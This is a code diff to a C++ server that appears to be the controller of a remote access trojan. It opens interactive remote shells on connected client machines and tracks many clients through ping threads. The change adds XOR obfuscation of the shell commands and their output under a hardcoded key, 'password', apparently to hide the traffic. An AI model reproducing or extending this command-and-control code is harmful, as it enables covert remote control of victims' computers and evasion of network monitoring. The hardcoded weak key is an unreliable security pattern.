@@ -206,16 +206,28 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 									//spawn thread to receive output from shell           
 									isReadingShell = true;
 									std::thread thCmd(&Server::threadRemoteCmdOutput, this, iClientID);
-									char cCmdLine[1024];
-									int icLen = 0;
+									char cCmdLine[512];
+									std::string strFinal = "";
+									int iStrLen = 0;
 									while(isReadingShell){
-										memset(cCmdLine, 0, 1024);
-										fgets(cCmdLine, 1024, stdin);
+										memset(cCmdLine, 0, 512);
+										fgets(cCmdLine, 512, stdin);
 										if(Clients[iClientID] == nullptr){
 											break;
 										}
-										icLen = strlen(cCmdLine);
-										send(Clients[iClientID]->sckSocket, cCmdLine, icLen, 0);
+										strFinal = txtCipher.ShellXor(std::string(cCmdLine), "password");
+										iStrLen = strFinal.length();
+										if(send(Clients[iClientID]->sckSocket, strFinal.c_str(), iStrLen, 0) <= 0){
+											std::cout<<"Unable to send command to client\n";
+											error();
+											isReadingShell = false;
+											break;
+										}
+										if(strcmp(cCmdLine, "exit\n") == 0){
+											std::cout<<"\nBye\n";
+											isReadingShell = false;
+											break;
+										}
 									}
 									thCmd.join();
 								} else {													
@@ -582,7 +594,6 @@ int Server::ssRecvBinary(int sckSocket, char*& cOutput, int sBytes){
 	}
 	cBuffer[iBytes] = '\0';
 	cOutput = txtCipher.BinaryUnCipher((const char *)cBuffer);
-	//std::cout<<cOutput<<'\n';
 	delete[] cBuffer;
 	cBuffer = nullptr;
 	return iBytes;
@@ -855,8 +866,6 @@ void Server::threadMasterCMD(){
 }
 
 void Server::threadClientPing(){
-	//std::cout<<"Statrted ping\n";
-	
 	while(isCmdThread){
 		for(int iClientID = 0; iClientID<Max_Clients; iClientID++){
 			if(Clients[iClientID] != nullptr && Clients[iClientID]->isConnected){
@@ -882,21 +891,19 @@ void Server::threadClientPing(){
 }
 
 void Server::threadRemoteCmdOutput(int iClientID){
+	std::string strCmdBuffer = "";
+	std::string strTmp = "";
+	std::string strPassword = "password";
 	char cCmdBuffer[1024];
-	memset(cCmdBuffer, 0, 1024);
 	int iBytes = 0;
 	while(isReadingShell){
 		if(Clients[iClientID] != nullptr){
-			//iBytes = ssRecvBinary(Clients[iClientID]->sckSocket, cCmdBuffer, 1024);
+			memset(cCmdBuffer, 0, 1024);
 			iBytes = recv(Clients[iClientID]->sckSocket, cCmdBuffer, 1024, 0);
 			if(iBytes > 0){
-				if(cCmdBuffer[0] == 'x' && cCmdBuffer[1] == '@' && cCmdBuffer[2] == '2'){
-					//end reading remote output
-					isReadingShell = false;
-					break;
-				}
-				std::cout<<cCmdBuffer;
-				memset(cCmdBuffer, 0, iBytes);
+				strTmp = cCmdBuffer;
+				strCmdBuffer = txtCipher.ShellXor(strTmp, strPassword);
+				std::cout<<strCmdBuffer;
 			} else if(iBytes == -1){
 				std::cout<<"Socket error\n";
 				error();
